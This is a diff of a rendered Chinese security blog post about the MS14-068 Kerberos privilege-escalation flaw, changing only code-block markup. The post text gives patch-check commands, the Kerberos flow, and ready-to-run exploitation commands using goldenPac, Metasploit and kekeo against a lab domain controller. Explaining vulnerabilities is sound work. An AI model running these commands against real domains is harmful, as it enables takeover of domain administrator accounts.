@@ -63,7 +63,7 @@
         "description": "MS14-068 (CVE-2014-6324) 是微软于 2014 年 11 月发布的补丁 (KB3011780) 中修复的一个漏洞，该漏洞允许攻击者以任意用户的权限提升到域管理员帐户权限，漏洞影响 Windows Server 2003 到 Windows Server 2012 R2 期间的 Windows 版本。 若是受影响的 Windows 版……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  1042 ,
+        "wordCount":  1029 ,
         "image": "https://blog.zjun.info/icons/apple-touch-icon.png",
         "publisher": {
             "@type": "Organization",
@@ -274,19 +274,10 @@
 </nav><div class="post-body e-content">
                 <p>MS14-068 (CVE-2014-6324) 是微软于 2014 年 11 月发布的补丁 (KB3011780) 中修复的一个漏洞，该漏洞允许攻击者以任意用户的权限提升到域管理员帐户权限，漏洞影响 <code>Windows Server 2003</code> 到  <code>Windows Server 2012 R2</code> 期间的 Windows 版本。</p>
 <p>若是受影响的 Windows 版本，漏洞自检可在域控命令查询，以下两种方式皆可：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systeminfo <span class="p">|</span>findstr <span class="s2">&#34;KB3011780&#34;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systeminfo <span class="p">|</span>findstr <span class="s2">&#34;KB3011780&#34;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">wmic qfe GET hotfixid <span class="p">|</span>findstr <span class="s2">&#34;KB3011780&#34;</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><h2 id="漏洞成因"><a href="#漏洞成因" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:漏洞成因" class="headings">漏洞成因</a></h2>
+</span></span></code></pre></div><h2 id="漏洞成因"><a href="#漏洞成因" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:漏洞成因" class="headings">漏洞成因</a></h2>
 <p>Kerberos 认证流程，引用 daiker 师傅的分析 <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">[1]</a></sup>：</p>
 <ol>
 <li>用户向 KDC 发起 AS_REQ， 请求凭据是用户 hash 加密的时间戳，KDC 使用用户 hash 进行解密，如果结果正确返回用 krbtgt hash 加密的 TGT 票据，TGT 里面包含 PAC，PAC 包含用户的 sid 和用户所在的组。</li>
@@ -303,40 +294,18 @@
 </ol>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:漏洞利用" class="headings">漏洞利用</a></h2>
 <p>利用 impacket 下的 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py" target="_blank" rel="noopener">goldenPac.py</a> 或者 Windows 环境下的 <a href="https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe" target="_blank" rel="noopener">goldenPAC.exe</a>，这个工具是 ms14-068 与 psexec 的结合，使用最方便快捷。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># goldenPac.py</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># goldenPac.py</span>
 </span></span><span class="line"><span class="cl">python3 goldenPac.py zjun.com/user1:P@ssw0rd@P-DC.zjun.com -dc-ip 172.16.86.136 -target-ip 172.16.86.136 -debug
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># goldenPac.exe</span>
 </span></span><span class="line"><span class="cl">goldenPac.exe zjun.com/user1:P@ssw0rd@P-DC.zjun.com
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>其他的如：msf (ms14_068_kerberos_checksum 模块)、kekeo、<a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-068/MS14-068.exe" target="_blank" rel="noopener">pykek</a> 都可以实现漏洞利用：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># msf</span>
+</span></span></code></pre></div><p>其他的如：msf (ms14_068_kerberos_checksum 模块)、kekeo、<a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-068/MS14-068.exe" target="_blank" rel="noopener">pykek</a> 都可以实现漏洞利用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># msf</span>
 </span></span><span class="line"><span class="cl">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># kekeo</span>
 </span></span><span class="line"><span class="cl">exploit::ms14068 /domain:zjun.com /user:user1 /password:P@ssw0rd /sid:S-1-5-21-2335421620-514153290-2844484534-1125 /ptt
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><section class="footnotes" role="doc-endnotes">
+</span></span></code></pre></div><section class="footnotes" role="doc-endnotes">
 <hr>
 <ol>
 <li id="fn:1" role="doc-endnote">
